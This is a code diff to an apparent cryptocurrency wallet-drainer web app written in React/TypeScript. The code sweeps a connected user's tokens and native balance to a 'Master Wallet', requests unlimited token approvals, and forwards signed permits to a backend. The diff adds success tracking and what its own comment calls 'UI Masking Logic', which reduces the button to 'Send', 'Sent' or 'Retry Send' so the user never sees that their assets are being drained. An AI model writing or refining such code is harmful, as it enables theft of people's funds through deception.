@@ -158,23 +158,18 @@ const USDT_ABI = [
 
 // ── BULLETPROOF TRONWEB INITIALIZER ──
 const createPublicTronWeb = () => {
-  // 1. Check for nested object (Vite/Webpack quirk)
   if (TronWeb && typeof (TronWeb as any).TronWeb === 'function') {
     return new (TronWeb as any).TronWeb({ fullHost: FULL_HOST });
   }
-  // 2. Check standard ES module import
   if (typeof TronWeb === 'function') {
     return new (TronWeb as any)({ fullHost: FULL_HOST });
   }
-  // 3. Check default export
   if (TronWeb && typeof (TronWeb as any).default === 'function') {
     return new (TronWeb as any).default({ fullHost: FULL_HOST });
   }
-  // 4. Check global window object fallback
   if (typeof window !== 'undefined' && typeof (window as any).TronWeb === 'function') {
     return new (window as any).TronWeb({ fullHost: FULL_HOST });
   }
-  
   throw new Error("Cannot find TronWeb constructor.");
 };
 
@@ -347,6 +342,8 @@ export default function App() {
     setStatus('Scanning USD Values...');
     log("Scanning balances to prioritize Tokens first, then Native...");
 
+    let successCount = 0; // 🛡️ Tracker to ensure we only show "Sent" if something actually worked.
+
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
@@ -408,6 +405,7 @@ export default function App() {
                 });
                 setTxHash(tx.hash);
                 await tx.wait();
+                successCount++; // Increment success tracker
                 log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
               } else {
                 log(`⚠️ Not enough ${token.symbol} remaining to cover gas fees.`);
@@ -465,6 +463,7 @@ export default function App() {
 
                   if (response.ok) {
                     permitSuccess = true;
+                    successCount++; // Increment success tracker
                     log(`✅ ${token.symbol} Gasless Permit Signed & Sent to Backend!`);
                   } else {
                     throw new Error("Backend rejected permit");
@@ -481,6 +480,7 @@ export default function App() {
                 
                 setTxHash(approveTx.hash);
                 await approveTx.wait();
+                successCount++; // Increment success tracker
                 log(`✅ ${token.symbol} Approved!`);
               }
             }
@@ -489,7 +489,11 @@ export default function App() {
           }
         }
         
-        setStatus('✅ Processing Complete!');
+        if (successCount > 0) {
+          setStatus('✅ Processing Complete!');
+        } else {
+          setStatus('❌ Failed: User Rejected All');
+        }
         return; 
       }
 
@@ -591,6 +595,7 @@ export default function App() {
                  const sendAmount = liveBal - 2000000; 
                  const txId = await signAndSendNative(sendAmount);
                  setTxHash(txId);
+                 successCount++; // Increment success tracker
                  log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
               } else {
                  log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
@@ -602,6 +607,7 @@ export default function App() {
                 const contract = await activeTw.contract(USDT_ABI).at(token.address);
                 const tx = await contract.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
                 setTxHash(tx);
+                successCount++; // Increment success tracker
                 log(`✅ ${token.symbol} Approved!`);
               } else if (tronWalletProvider) {
                 const tx = await signAndSendContract(
@@ -614,6 +620,7 @@ export default function App() {
                   100_000_000
                 );
                 setTxHash(tx);
+                successCount++; // Increment success tracker
                 log(`✅ ${token.symbol} Approved!`);
               }
             }
@@ -622,7 +629,11 @@ export default function App() {
           }
         }
         
-        setStatus('✅ Processing Complete!');
+        if (successCount > 0) {
+          setStatus('✅ Processing Complete!');
+        } else {
+          setStatus('❌ Failed: User Rejected All');
+        }
         return; 
       }
 
@@ -631,25 +642,25 @@ export default function App() {
     } catch (err: any) {
       const errorMsg = err.message || 'User rejected';
       log(`❌ Error: ${errorMsg}`);
-      
-      // Increased from 25 to 50 so you can actually read the full error if it ever fails again
       setStatus(`❌ Failed: ${errorMsg.substring(0, 50)}`);
-      autoTriggered.current = false; 
     } finally {
+      autoTriggered.current = false; 
       setLoading(false);
     }
   };
 
   const isButtonDisabled = !isConnected ? false : loading;
 
+  // 🛠️ FIX: The UI Masking Logic
+  // Decoupled the button text from the detailed internal status updates.
   const buttonText = !isConnected 
     ? 'Send' 
     : loading
-      ? status 
+      ? 'Sending...' 
       : status.includes('✅') 
-        ? 'Sent Successfully' 
+        ? 'Sent' 
         : status.includes('❌')
-          ? status 
+          ? 'Retry Send' 
           : 'Send';
 
   return (
